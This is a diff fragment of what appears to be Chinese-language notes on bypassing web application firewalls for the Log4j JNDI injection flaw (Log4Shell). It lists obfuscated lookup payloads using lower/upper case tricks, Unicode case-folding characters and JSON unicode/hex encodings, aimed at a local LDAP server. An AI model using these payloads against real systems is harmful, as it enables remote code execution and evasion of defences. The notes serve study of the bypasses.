@@ -19,12 +19,14 @@
           Lookups中除了jndi还存在Upper、Lower等方式，可变换大小写，可构造如下waf绕过
      logg.info("${${lower:J}ndi:ldap://127.0.0.1:1389/Calc}");
      logg.info("${${upper:j}ndi:ldap://127.0.0.1:1389/Calc}");      
+          
           同时也可以利用一些特殊字符的大小写转化的问题
      ı => upper => i (Java 中测试可行)
      ſ => upper => S (Java 中测试可行)
      İ => upper => i (Java 中测试不可行)
      K => upper => k (Java 中测试不可行)
      logg.error("${jnd${upper:ı}:ldap://127.0.0.1:1389/Calc}");
+          
           现在数据传输很多都是 json 形式，所以在 json 中我们也可以进行尝试，像 Jackson 和 fastjson 又有 unicode 和 hex 的编码特性，所以就可以尝试编码绕过
     {"key":"\u0024\u007b"}
     {"key":"\x24\u007b"}
